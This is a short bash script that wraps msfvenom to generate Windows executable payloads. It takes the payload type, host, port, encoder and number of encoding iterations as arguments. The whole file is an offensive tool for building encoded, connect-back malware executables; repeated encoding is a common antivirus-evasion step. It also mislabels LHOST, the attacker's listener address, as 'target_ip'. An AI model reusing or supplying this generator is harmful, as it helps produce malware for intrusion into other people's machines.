#!/bin/bash

# Check if the necessary dependencies are installed
if ! [ -x "$(command -v msfvenom)" ]; then
    echo 'Error: msfvenom is not installed.' >&2
    exit 1
fi

# Check if the user provided the necessary arguments
if [ $# -ne 6 ]; then
    echo "Usage: msfvenom.sh [payload] [target_ip] [target_port] [output_file] [encoder] [iterations]"
    exit 1
fi

# Assign the arguments to variables
payload=$1
target_ip=$2
target_port=$3
output_file=$4
encoder=$5
iterations=$6

# Generate the payload using msfvenom
msfvenom -p $payload LHOST=$target_ip LPORT=$target_port -f exe -e $encoder -i $iterations -o $output_file

echo "Payload generated successfully. Check the results in the '$output_file' file"
